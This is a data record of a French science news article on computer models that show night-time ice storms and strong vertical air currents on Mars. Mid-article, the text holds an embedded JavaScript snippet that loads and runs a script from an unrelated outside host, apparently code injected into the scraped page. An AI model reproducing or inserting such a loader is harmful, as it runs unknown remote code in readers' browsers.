{"title": "Sur Mars, il y aurait des tempetes de neige la nuit !", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-08-23", "content": "De violentes tempetes, de puissantes avalanches d'air, de la neige : voila ce que connaitraient, a la nuit tombee, les Martiens s'il y en avait. Bien loin de ce qu'indiquaient les observations et les modeles, l'atmosphere de la Planete rouge serait plus active et complexe que prevu, selon une nouvelle analyse des observations d'orbiteurs. Ce qu'il faut retenir Des mouvements d'air verticaux plus puissants que prevu sont declenches dans la haute atmosphere martienne apres le coucher du Soleil. Au niveau d'une zone de melange avec de l'air plus chaud, ils generent une production importante de petites particules de glace descendant a grande vitesse, d'apres une nouvelle modelisation. Ces mouvements verticaux pourraient etre un mecanisme de perte d'eau pour la planete Mars. En 2008, l' atterrisseur Phoenix , pose en region polaire nord, avait vu passer des  nuages  de glace d'eau et il etait evident pour tout le monde que de la neige ou de la glace devait parfois tomber jusqu'au sol. De plus, les  calottes polaires , au nord et au sud, sont composees de glace de CO 2  mais aussi d'eau. Enfin, les etudes depuis l' orbite  avaient montre l'existence d'echanges verticaux au sein de l' atmosphere . Mais rien de mechant, pensait-on. Les particules de glace ou de neige devaient gentiment grossir, jusqu'a tomber lentement du fait de la  gravite , et finir, le plus souvent, par s'evaporer apres un ou deux kilometres d'une chute devant durer plusieurs heures. Nul ne les imaginait suffisamment puissants pour generer des  tempetes . C'est pourtant ce qui ressort d'une triple simulation effectuee par une equipe internationale, menee par le Francais Aymeric Spiga et publiee dans  Nature Geosciences . Selon lui, les particules d'eau gelee, minuscules, doivent tomber a grande  vitesse  et il ne leur faut que cinq a dix minutes pour une chute de un ou deux kilometres. Des nuages observes en 2008 par l'atterrisseur Phoenix, pose en region polaire. (c) Nasa, JPL                               Les tempetes insoupconnees des nuits martiennes Le travail a revisite les observations de deux sondes en orbite, MGS ( Mars Global Surveyor ) et  MRO  ( Mars Reconnaissance Orbiter ). La nouveaute est que ces chercheurs ont modelise le  climat martien  a trois echelles, planetaire, regionale et locale. Leurs resultats montrent des effets inattendus du refroidissement  nocturne  a haute altitude, vers 20 a 40 km du sol.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Apres le coucher du  Soleil , leur  modelisation  indique que la temperature a l'interieur des nuages chute de 4 degC par heure. De puissants  mouvements  de  convection  apparaissent alors au sein des nuages et dessous, expliquent-ils, et de forts courants descendants atteignent, plus bas, un  air  plus chaud. La rencontre doit avoir lieu a environ 8 km d'altitude vers 2 h du matin, en heure solaire locale bien sur. Il en resulte que des regions de Mars doivent parfois connaitre de terribles chutes de neige ou de glace, avec des  vents  violents. Une vue d'artiste de Phoenix, pose sur le sol martien. L'engin a pu analyser le sol grace a une pelle (a gauche) et a observe de la glace d'eau. (c) Nasa, JPL                               La meteo de Mars est plus complexe que prevu Les modeles globaux du  climat  de Mars n'ont jamais montre l'existence de cette couche de melange car ils ne prennent pas en compte ces mouvements a petite echelle. Et a l'inverse, les modeles locaux utilises seuls, n'integrant pas les donnees a grande echelle, ne predisent pas ce phenomene. Cependant, cette modelisation n'explique pas tout. Elle predit en effet que cette convection doit aussi provoquer des mouvements d'air ascendants a tres haute altitude, generant un transport d'eau vers la  troposphere . Il y aurait la un mecanisme capable d'expedier l'eau martienne dans l'espace, selon les auteurs. Voila qui expliquerait comment Mars peut  perdre son eau . Mais le modele ne donne pas de valeur chiffree, et ne dit donc pas si le bilan global est d'envoyer l'eau vers le bas ou vers le haut. D'une maniere generale, la decouverte demontre que nous connaissons mal la  meteo  martienne et en particulier les mouvements verticaux au sein de l' atmosphere . Elle interesse aussi l' astronautique . Des tentatives d'atterrissages ou des installations de  rovers , voire d'humains, gagneront a anticiper ces coleres atmospheriques. Le saviez-vous ? Une observation recente, suite a un reexamen des mesures de la sonde Mars Odyssey (en orbite autour de Mars depuis 2001), indique que de grandes quantites d'eau gelee se trouvent dans le sol dans les regions equatoriales. Jusque-la, on pensait l'eau surtout presente dans le sol des hautes latitudes. La decouverte a ete faite grace a une methode astucieuse de l'analyse des donnees fournies par le spectrometre a neutrons, capable de detecter la presence d'hydrogene dans le sol. Au-dessus d'une certaine quantite, la presence d'eau est tres probable. La nouvelle methode a en quelque sorte presque double la precision de l'instrument, permettant la decouverte de reservoirs d'eau jusque-la passes inapercus. Nasa : revivez 20 ans d'exploration de Mars                       La Nasa nous invite a revivre en video les temps forts de toutes les missions qui se sont succede autour de Mars et a sa surface. Ces aventures, variees, couronnees de succes et surprenantes, nous ont beaucoup appris sur la Planete rouge et son habitabilite passee.                                       ", "theme": "sciences"}